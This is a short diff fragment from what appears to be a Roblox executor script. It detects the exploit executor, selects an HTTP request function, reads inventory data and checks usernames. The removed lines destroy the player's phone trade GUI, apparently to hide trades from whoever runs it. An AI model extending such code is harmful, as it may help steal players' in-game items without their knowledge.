@@ -15,10 +15,6 @@ local GetProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData
 local request = (syn and syn.request) or (http and http.request) or (http_request) or request
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
-local tradeGui_phone = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone
-
-tradeGui_phone:destroy()
-
 local function isUsernameInList(name)
 	for _, v in ipairs(usernames) do
 		if v == name then return true end
